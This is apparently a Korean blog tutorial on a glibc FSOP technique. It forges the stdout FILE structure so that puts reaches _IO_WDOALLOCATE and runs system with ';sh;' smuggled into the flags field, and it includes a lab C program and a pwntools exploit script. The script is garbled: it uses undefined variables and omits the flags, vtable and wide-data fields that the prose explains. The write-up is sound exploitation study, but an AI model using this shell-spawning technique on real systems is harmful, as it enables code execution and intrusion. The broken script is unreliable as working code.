FSOP는 파일 구조체를 조작해서 파일 스트림을 사용하는 함수들을 대상으로 공격을 할 수 있는 기법이다. 

파일 스트림을 사용하는 함수들을 생각해보면 fputs, fread, fopen, fclose... 이런 것들이 있다. 함수들의 이름을 보면 알겠지만 앞에 file 을 뜻하는 f가 붙어있는 것을 알 수 있다.

하지만 앞에 f가 붙지 않아도 파일 스트림을 사용하는 함수가 있다.
바로 puts이다!

## 1. 코드 분석

```c
int
_IO_puts (const char *str)
{
  int result = EOF;
  size_t len = strlen (str);
  _IO_acquire_lock (stdout);

  if ((_IO_vtable_offset (stdout) != 0
       || _IO_fwide (stdout, -1) == -1)
      && _IO_sputn (stdout, str, len) == len
      && _IO_putc_unlocked ('\n', stdout) != EOF)
    result = MIN (INT_MAX, len + 1);

  _IO_release_lock (stdout);
  return result;
}

weak_alias (_IO_puts, puts)
libc_hidden_def (_IO_puts)
```

내부적으로 stdout을 사용한다는 것을 알 수 있다. stdout은 파일 구조체를 가지기 때문에 FSOP의 공격 대상이 될 수 있다.

어떤 식으로 공격을 해야하나 살펴보자.
위 코드를 보면 _IO_sputn을 호출한다.

```c
#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)
```

_IO_sputn은 _IO_XSPUTN이다. 이는 _IO_default_xsputn 와 같다.

```c
size_t
_IO_default_xsputn (FILE *f, const void *data, size_t n)
{
  const char *s = (char *) data;
  size_t more = n;
  if (more <= 0)
    return 0;
  for (;;)
    {
      /* Space available. */
      if (f->_IO_write_ptr < f->_IO_write_end)
	{
	  size_t count = f->_IO_write_end - f->_IO_write_ptr;
	  if (count > more)
	    count = more;
	  if (count > 20)
	    {
	      f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count);
	      s += count;
	    }
	  else if (count)
	    {
	      char *p = f->_IO_write_ptr;
	      ssize_t i;
	      for (i = count; --i >= 0; )
		*p++ = *s++;
	      f->_IO_write_ptr = p;
	    }
	  more -= count;
	}
      if (more == 0 || _IO_OVERFLOW (f, (unsigned char) *s++) == EOF) //here!!!
	break;
      more--;
    }
  return n - more;
}
```

해당 함수는 위와 같이 구현되어 있다. 이제 분석해보자.
코드 마지막 부분에 _IO_OVERFLOW 함수가 보인다.
이는 다음과 같이 정의된다.

```c
#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)
#define _IO_JUMPS_FUNC(THIS) \
  (IO_validate_vtable                                                   \
   (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS)	\
			     + (THIS)->_vtable_offset)))
```
vtable을 사용해여 함수를 호출하는 것을 알 수 있다. 2.35 이전에는 IO_validate_vtable 검증이 존재하지 않아서 이걸로 바로 임의 코드 실행이 가능했지만 현재는 불가능하다. 하지만 vtable에 있는 함수라면 vtable을 조금 조정하여 해당 함수를 호출할 수 있다!!

이제 우리는 이를 활용하여 vtable 검증을 하지않는 WJUMP# 계열의 함수들을 호출하여 임의 코드를 실행할 수 있다!

```c
#define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)
#define _IO_WIDE_JUMPS(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable
#define _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \
  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \
				       + offsetof(TYPE, MEMBER)))
```

_IO_wfile_overflow를 호출한다고 했을 경우를 살펴보자.

```c
wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
    {
      /* Allocate a buffer if needed. */
      if (f->_wide_data->_IO_write_base == 0)
	{
	  _IO_wdoallocbuf (f); // here!!
	  _IO_free_wbackup_area (f);
	  _IO_wsetg (f, f->_wide_data->_IO_buf_base,
		     f->_wide_data->_IO_buf_base, f->_wide_data->_IO_buf_base);

	  if (f->_IO_write_base == NULL)
	    {
	      _IO_doallocbuf (f);
	      _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
	    }
	}
    
  ...
```

```c
void
_IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF) // here !!
      return;
  _IO_wsetb (fp, fp->_wide_data->_shortbuf,
		     fp->_wide_data->_shortbuf + 1, 0);
}
```

```c
#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
```

_IO_OVERFLOW -> _IO_wfile_overflow -> _IO_wdoallocbuf -> _IO_WDOALLOCATE 이 경로를 따라 임의 코드를 실행시킬 수 있음을 알 수 있다.

임의 코드를 실행하기 앞서 우리가 직접 조작해야하는 값들은 다음과 같다.

1. if(f->_flags & _IO_NO_WRITES) 평가가 거짓이여야 함.

2. if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0) 평가가 참이여야 함.

3. if (f->_wide_data->_IO_write_base == 0) 평가가 참이여야 함.

4. if (fp->_wide_data->_IO_buf_base) 평가가 거짓이여야 함.

5. if (!(fp->_flags & _IO_UNBUFFERED)) 평가가 참이여야 함.

다른 조건들은 따로 터치 안해도 잘 넘어가져서 언급하지 않겠다.


## 2. 실습

간단한 실습을 진행해보자.

```c
// test.c
// gcc test.c -o test -g
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>

int main(){
    setbuf(stdout, 0);
    setbuf(stdin, 0);
    setbuf(stderr, 0);
    
    printf("STDOUT : %p\n",stdout);
    read(0,stdout,300);

    puts("hello?");

    return 0;
}
```

```python
from pwn import *

p = process("./test")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# gdb.attach(p)

print(f"libc base : {hex(libc_base)}")

payload += p64(0) # _IO_read_ptr
payload += p64(0) # _IO_read_end
payload += p64(0) # _IO_read_base
payload += p64(0) # _IO_write_base
payload += p64(0) # _IO_write_ptr
payload += p64(0) # _IO_write_end

payload += p64(0) # _IO_buf_end

payload += p64(0) # _markers
payload += p64(system) # _chain
payload += p32(0) # _fileno
payload += p32(0) # _flags2
payload += p64(0) # _old_offset
payload += p16(0) # _cur_column
payload += p8(0) # _vtable_offset
payload += p8(0) # _shortbuf
payload += p32(0)

payload += p64(0) # _offset
```

일단 익스 코드를 보면 이해가 가지 않는 부분이 있을 것이다.

왜 chain 부분에 system 주소가 들어가고 flag에는 sh가 있는거고, wide_data는 stdout을 가리키는가..

그리고 어째서 more append 값은 stdout인가..

일단 순서대로 짚어보자.

_IO_OVERFLOW 가 호출 될 때 vtable의 위치를 조금 조정해서  _IO_wfile_overflow가 호출되게 해야하기 때문에 vtable 값이 wfile_jumps - 32로 해준 것이다.

![1](/assets/img/2026/fsop-puts/1.png)

위에서 _IO_OVERFLOW -> _IO_wfile_overflow -> _IO_wdoallocbuf -> _IO_WDOALLOCATE 흐름이 이렇다고 했었는데,
이 흐름에서 wide_data의 wide_vtable 구조체를 참조해서 해당 함수를 호출한다.
wide_data 구조체는 일반 파일 구조체와 flags 멤버가 없는 것을 제외하면 거의 같은 구조를 지닌다.

wide_data는 stdout을 가리키고 있기 때문에
wide_data -> vtable 은 결국
stdout-> more_append ==  wide_data->vtable 이렇게 된다. 
그래서 more_append 부분에 stdout 이 들어간다. 

chain 부분에 system이 들어간 이유, flags의 값이 저런 이유는 아래와 같다.

![2](/assets/img/2026/fsop-puts/2.png)

여기서 doallocate는 14번째에 존재하는데, 지금 wide_data->vtable을 stdout 으로 덮어씌웠기 때문에 stdout에서 8바이트 단위로 했을 경우 14번째 오프셋에 있는 값으로 함수를 호출한다.

stdout에서 14번째 오프셋은 _chain이다!

![3](/assets/img/2026/fsop-puts/3.png)
![4](/assets/img/2026/fsop-puts/4.png)

system("sh")를 실행시켜야하는데, 함수의 인자인 rdi가 stdout의 flags로 고정되어 있다.

그냥 flags에 /bin/sh나 sh 만 박아두면 flags 검사를 통과하지 못하기 때문에 \x01\x01\x01\x01;sh; 이렇게 한 것이다.

system 함수가 실행하는 명령은 ; 으로 구분되기 때문에 이 처럼 하면 검사를 통과하면서 쉘도 띄울 수 있다.

![5](/assets/img/2026/fsop-puts/5.png)

공부하면서 소스코드 옆에 띄워두고 보며 gdb로 삽질 많이 했었는데, 도움이 많이 된 것 같다!

나중에 다른 방법으로 할 수 있는 FSOP에 대해서도 글을 써보겠다.
